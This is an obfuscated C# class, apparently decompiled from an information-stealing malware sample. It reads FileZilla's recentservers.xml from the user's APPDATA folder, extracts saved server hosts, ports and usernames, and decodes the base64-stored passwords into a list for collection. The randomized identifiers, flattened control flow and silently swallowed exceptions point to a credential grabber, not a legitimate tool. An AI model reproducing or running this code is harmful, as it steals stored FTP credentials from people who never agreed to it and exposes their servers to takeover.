using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class SXo : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string CDmN8wD6xi
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public SXo()
	{
		CDmN8wD6xi = "FileZilla";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			switch (num)
			{
			case 2:
				try
				{
					if (!File.Exists(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\recentservers.xml"))
					{
						return list;
					}
					string[] array = File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\recentservers.xml").gy6HND7Xm("<Server>");
					if (array == null)
					{
						return list;
					}
					string[] array2 = array;
					foreach (string text in array2)
					{
						try
						{
							ii68 ii69 = new ii68();
							if (text.Contains("<Host>"))
							{
								ii69.byIdLuuGZbL = b4v.x8jPE1(text, "<Host>", "</Host>") + ":" + b4v.x8jPE1(text, "<Port>", "</Port>");
							}
							if (text.Contains("<User>"))
							{
								ii69.S8v = b4v.x8jPE1(text, "<User>", "</User>");
							}
							if (text.Contains("<Pass encoding=\"base64\">"))
							{
								ii69._9H5rP7hg2 = Encoding.UTF8.GetString(Convert.FromBase64String(b4v.x8jPE1(text, "<Pass encoding=\"base64\">", "</Pass>")));
							}
							else if (text.Contains("<Pass>"))
							{
								ii69._9H5rP7hg2 = b4v.x8jPE1(text, "<Pass encoding=\"base64\">", "</Pass>");
							}
							ii69.oVAe = CDmN8wD6xi;
							if (!string.IsNullOrEmpty(ii69.S8v) && !string.IsNullOrEmpty(ii69._9H5rP7hg2) && !string.IsNullOrEmpty(ii69.byIdLuuGZbL))
							{
								list.Add(ii69);
							}
						}
						catch
						{
						}
					}
					return list;
				}
				catch
				{
					return list;
				}
			case 0:
				num = 1;
				break;
			}
		}
		while (num != 3);
		List<ii68> result = default;
		return result;
	}
}
